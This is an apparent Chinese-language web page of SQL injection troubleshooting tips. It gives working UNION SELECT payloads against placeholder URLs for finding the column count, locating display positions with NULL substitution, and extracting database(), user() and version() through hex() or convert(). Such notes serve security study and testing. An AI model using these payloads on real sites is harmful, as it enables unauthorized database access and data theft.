---
layout: default
---
# ![](../img/hj.jpg)SQL漏洞挖掘
>小贱提示： 通常出现在登陆页面，获取HTTP头（user-agent/client-ip/x-forwarded-for等）、订单处理等地方

## ![](../img/github27.png)显示位能显示数字却不显示user()
很可能是编码问题

方法1，用hex():
```html
id=-1 union select 1,2,hex(concat(database(),0x5c,user(),0x5c,version())),4,5,6 from xxx
```
方法2，用convert():
```html
id=-1 union select 1,2,convert(concat(database(),0x5c,user(),0x5c,version()) using latin1),4,5,6 from xxx
```
## ![](../img/github1.png)order by能查到字段数，但union select时页面跳转到xxx.com/n，404错误
如：
```html
http://www.test.com/news.php?id=12' order by 13%23
```
页面显示正常，14错误，说明注入点为字符型，字段数为13
```html
http://www.test.com/news.php?id=0‘ union select 1,2,3,4,5,6,7,8,9,10,11,12,13%23
```
页面跳转到http://www.test.com/3,说明3号位置有异常

解决办法：用null替换掉异常位置，如：
```html
http://www.test.com/news.php?id=0‘ union select 1,2,null,4,5,6,7,8,concat(database(),0x3a,user(),0x3a,version()),10,11,12,13
```
## ![](../img/github2.png)union select时提示说类型错误
把数字用null全部替换掉
```html
id =1 union select null,null,null,null,null,null,null,null,null,null,null,null,null%23
```
然后把null依次替换成相应数字，一次替换一个，如果正常返回就保留数字，如果错误就替换回null，在替换下一个数字（当然也可以替换文本‘a’，‘b’等，也可以数字文本相结合）

最后的结果是
```html
union select null,2,3,null,‘a',null,'b',8,null,null,null,null,null%23，
```
这样就能够定位显示位是哪个了，这里如果开了gpc，可以把字符串都换成version()

## ![](../img/github3.png)查字段数可以用id=1 order by也可以用id=1 union select 1,2,3,4,5
原理：union select的前提是两侧字段数目相同
__原创文章，转载请注明转载自[http://www.8pwn.com](http://www.8pwn.com)__

[返回上一层](./web)
